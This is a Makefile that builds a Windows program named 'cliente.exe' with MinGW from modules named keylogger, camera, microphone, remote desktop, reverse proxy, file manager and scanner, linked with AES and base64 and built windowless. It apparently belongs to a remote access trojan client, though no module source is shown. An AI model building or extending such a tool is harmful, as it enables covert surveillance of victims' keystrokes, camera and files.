LINK2=-lmfplat -lmfreadwrite -lnetapi32 -lmfuuid -lmf -lwmcodecdspuuid -lstrmiids -luuid -lws2_32 -lole32 -lgdiplus -lshlwapi -liphlpapi -lcrypt32 -lbcrypt -Wl,-Bstatic -s -w -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libgcc -Wl,-Bstatic -mwindows
LINK=-lmfplat -lmfreadwrite -lmfuuid -lole32 -lmf -lwmcodecdspuuid -lstrmiids -luuid -lws2_32 -lwinmm -lwtsapi32 -lgdi32 -lgdiplus -lshlwapi
CFLAG=-Wall -Wextra -std=c++14 -Wpedantic
OBJ=main.o misc.o cliente.o mod_mic.o mod_file_manager.o mod_keylogger.o mod_camara.o mod_remote_desktop.o mod_fun.o mod_escaner.o mod_ventanas.o mod_reverse_proxy.o mod_info.o
#ZLIB= ../zlib/compress.o ../zlib/inflate.o ../zlib/infback.o ../zlib/inftrees.o ../zlib/trees.o ../zlib/inffast.o ../zlib/adler32.o ../zlib/deflate.o ../zlib/crc32.o ../zlib/zutil.o ../zlib/uncompr.o
BIN=cliente.exe
CC=x86_64-w64-mingw32-g++.exe
GCC=x86_64-w64-mingw32-gcc.exe
RM=rm

%.o: %.cpp
	$(CC) $(CFLAG) -c -o $@ $<

zlib/%.o: ../zlib/%.c
	$(CC) $(CFLAG) -c -o $@ $<

$(BIN):aes256.o base64.o sqlite3.o $(OBJ) #$(ZLIB)
	#$(CC) -o $(BIN) $(OBJ) $(ZLIB) aes256.o base64.o $(LINK2)
	$(CC) -o $(BIN) $(OBJ) sqlite3.o aes256.o base64.o $(LINK2)

aes256.o: ../aes256/aes256.cpp
	$(CC) $(CFLAG) -c -o $@ $<
	
sqlite3.o: ../sqlite3/sqlite3.c
	$(GCC) -Wall -Wextra -Wpedantic -c -o $@ $<

base64.o: ../base64/base64.cpp
	$(CC) $(CFLAG) -c -o $@ $<

clean:
	$(RM) *.o $(BIN)

